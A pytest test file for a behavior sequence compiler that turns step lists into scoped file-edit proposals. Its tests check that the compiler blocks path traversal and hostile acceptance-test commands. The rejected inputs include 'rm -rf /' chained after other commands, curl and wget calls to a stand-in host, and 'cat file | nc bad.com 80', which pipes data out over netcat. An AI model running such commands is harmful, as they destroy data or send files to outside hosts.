"""Tests for the Behavior Sequence Compiler."""

from __future__ import annotations

import json

import pytest

from swarm.compiler.compiler import BehaviorSequenceCompiler


@pytest.fixture
def compiler(tmp_path):
    """Create a BSC with a temp workspace."""
    return BehaviorSequenceCompiler(tmp_path / "workspace")


@pytest.fixture
def simple_sequence():
    """A simple 3-step behavior sequence."""
    return {
        "sequence_name": "compose-document",
        "ordered_steps_json": json.dumps([
            {"op": "create", "path": "output/doc.md", "content": "# Title\n\n"},
            {"op": "append", "path": "output/doc.md", "content": "*By Author*\n\n"},
            {"op": "append", "path": "output/doc.md", "content": "Body text here\n"},
        ]),
        "target_paths_json": json.dumps(["output/"]),
        "acceptance_tests_json": json.dumps([
            {
                "test_id": "verify-file",
                "command": "test -f output/doc.md",
                "expected_exit_code": 0,
            },
            {
                "test_id": "verify-title",
                "command": "grep -q '# Title' output/doc.md",
                "expected_exit_code": 0,
            },
        ]),
    }


@pytest.fixture
def run_context():
    return {"run_id": "run-test-001", "workspace_root": "/tmp/workspace"}


# ──────────────────────────────────────────────
# Compilation tests
# ──────────────────────────────────────────────


class TestBehaviorSequenceCompiler:
    def test_compile_simple_sequence(self, compiler, simple_sequence, run_context):
        proposal = compiler.compile("swarm-001", simple_sequence, run_context)
        assert proposal["source"] == "internal"
        assert "swarm-001" in proposal["proposal_id"]
        assert len(proposal["modifications"]) == 3
        assert proposal["modifications"][0]["operation"] == "create"
        assert proposal["modifications"][1]["operation"] == "append"
        assert proposal["modifications"][2]["operation"] == "append"

    def test_proposal_has_required_fields(self, compiler, simple_sequence, run_context):
        proposal = compiler.compile("swarm-001", simple_sequence, run_context)
        assert "proposal_id" in proposal
        assert "source" in proposal
        assert "intent" in proposal
        assert "target_paths" in proposal
        assert "modifications" in proposal
        assert "acceptance_tests" in proposal
        assert "scope_boundary" in proposal
        assert "created_at" in proposal

    def test_target_paths_extracted(self, compiler, simple_sequence, run_context):
        proposal = compiler.compile("swarm-001", simple_sequence, run_context)
        assert "output/doc.md" in proposal["target_paths"]

    def test_acceptance_tests_bound(self, compiler, simple_sequence, run_context):
        proposal = compiler.compile("swarm-001", simple_sequence, run_context)
        assert len(proposal["acceptance_tests"]) == 2
        assert proposal["acceptance_tests"][0]["test_id"] == "verify-file"
        assert proposal["acceptance_tests"][0]["command"] == "test -f output/doc.md"
        assert proposal["acceptance_tests"][0]["expected_exit_code"] == 0

    def test_scope_boundary(self, compiler, simple_sequence, run_context):
        proposal = compiler.compile("swarm-001", simple_sequence, run_context)
        boundary = proposal["scope_boundary"]
        assert "output/" in boundary["allowed_paths"]
        assert "src/" in boundary["denied_paths"]
        assert "runtime/" in boundary["denied_paths"]


# ──────────────────────────────────────────────
# Scope enforcement tests
# ──────────────────────────────────────────────


class TestScopeEnforcement:
    def test_reject_path_traversal(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "../../etc/passwd", "content": "bad"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        with pytest.raises(ValueError, match="traversal"):
            compiler.compile("swarm-001", sequence, run_context)

    def test_reject_absolute_path(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "/etc/passwd", "content": "bad"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        with pytest.raises(ValueError, match="absolute path"):
            compiler.compile("swarm-001", sequence, run_context)

    def test_reject_out_of_scope_path(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "src/bad.py", "content": "bad"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        with pytest.raises(ValueError, match="Scope violation"):
            compiler.compile("swarm-001", sequence, run_context)


# ──────────────────────────────────────────────
# Acceptance test validation
# ──────────────────────────────────────────────


class TestAcceptanceTestValidation:
    def _make_sequence(self, test_command):
        return {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "output/a.txt", "content": "x"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": test_command, "expected_exit_code": 0},
            ]),
        }

    def test_reject_dangerous_command_curl(self, compiler, run_context):
        with pytest.raises(ValueError, match="dangerous"):
            compiler.compile(
                "s1", self._make_sequence("curl http://bad.com"), run_context
            )

    def test_reject_dangerous_command_wget(self, compiler, run_context):
        with pytest.raises(ValueError, match="dangerous"):
            compiler.compile(
                "s1", self._make_sequence("wget http://bad.com"), run_context
            )

    def test_reject_semicolon_chaining(self, compiler, run_context):
        with pytest.raises(ValueError, match="dangerous"):
            compiler.compile(
                "s1", self._make_sequence("echo ok; rm -rf /"), run_context
            )

    def test_reject_pipe(self, compiler, run_context):
        with pytest.raises(ValueError, match="dangerous"):
            compiler.compile(
                "s1", self._make_sequence("cat file | nc bad.com 80"), run_context
            )

    def test_reject_and_chaining(self, compiler, run_context):
        with pytest.raises(ValueError, match="dangerous"):
            compiler.compile(
                "s1", self._make_sequence("echo ok && rm -rf /"), run_context
            )

    def test_allow_safe_commands(self, compiler, run_context):
        compiler.compile("s1", self._make_sequence("test -f output/a.txt"), run_context)
        compiler.compile(
            "s1", self._make_sequence("grep -q 'hello' output/a.txt"), run_context
        )

    def test_reject_empty_tests(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "output/a.txt", "content": "x"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([]),
        }
        with pytest.raises(ValueError, match="acceptance test"):
            compiler.compile("s1", sequence, run_context)


# ──────────────────────────────────────────────
# Step normalization tests
# ──────────────────────────────────────────────


class TestStepNormalization:
    def test_unknown_operation_rejected(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "explode", "path": "output/a.txt", "content": "x"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        with pytest.raises(ValueError, match="invalid operation"):
            compiler.compile("s1", sequence, run_context)

    def test_empty_steps_rejected(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        with pytest.raises(ValueError, match="no steps"):
            compiler.compile("s1", sequence, run_context)

    def test_run_test_steps_excluded_from_modifications(self, compiler, run_context):
        sequence = {
            "ordered_steps_json": json.dumps([
                {"op": "create", "path": "output/a.txt", "content": "x"},
                {"op": "run_test", "command": "echo ok"},
            ]),
            "target_paths_json": json.dumps(["output/"]),
            "acceptance_tests_json": json.dumps([
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ]),
        }
        proposal = compiler.compile("s1", sequence, run_context)
        assert len(proposal["modifications"]) == 1
        assert proposal["modifications"][0]["operation"] == "create"

    def test_accepts_list_directly(self, compiler, run_context):
        """BSC should accept lists directly (not just JSON strings)."""
        sequence = {
            "ordered_steps_json": [
                {"op": "create", "path": "output/a.txt", "content": "x"},
            ],
            "target_paths_json": ["output/"],
            "acceptance_tests_json": [
                {"test_id": "t1", "command": "echo ok", "expected_exit_code": 0},
            ],
        }
        proposal = compiler.compile("s1", sequence, run_context)
        assert len(proposal["modifications"]) == 1
